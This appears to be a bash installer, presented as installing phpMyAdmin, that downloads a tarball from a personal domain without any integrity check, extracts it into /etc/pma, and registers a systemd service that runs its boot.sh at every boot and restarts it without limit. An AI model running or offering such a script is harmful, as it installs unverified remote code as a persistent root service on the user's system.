#!/bin/bash

PMA_INSTALL_DIR="/etc/pma"
SERVICE_NAME="LPMAS"
SERVICE_PATH="/etc/systemd/system/$SERVICE_NAME.service"

# Function to check if the service already exists
check_service_exists() {
    if systemctl is-active "$SERVICE_NAME" &>/dev/null; then
        echo "Error: The service $SERVICE_NAME is already installed."
        exit 1
    fi
}

install_phpmyadmin() {
    PMA_URL="https://huzpsb.eu.org/pma.tar.gz?i=1"
    wget -q --show-progress -O /tmp/pma.tar.gz "$PMA_URL"
    mkdir -p "$PMA_INSTALL_DIR"
    tar -xf /tmp/pma.tar.gz -C "$PMA_INSTALL_DIR"
    rm /tmp/pma.tar.gz
}

# Function to create the service for automatic startup
create_service() {
    cat <<EOL | tee "$SERVICE_PATH" > /dev/null
[Unit]
Description=Linux PMA Service
After=default.target
StartLimitIntervalSec=0

[Service]
Restart=always
RestartSec=1
ExecStart=/bin/bash $PMA_INSTALL_DIR/boot.sh
 
[Install]
WantedBy=default.target
EOL
    systemctl enable "$SERVICE_NAME"
    systemctl start "$SERVICE_NAME"
}

# Main script
check_service_exists
echo Downloading libraries...
install_phpmyadmin
create_service
clear
echo Done
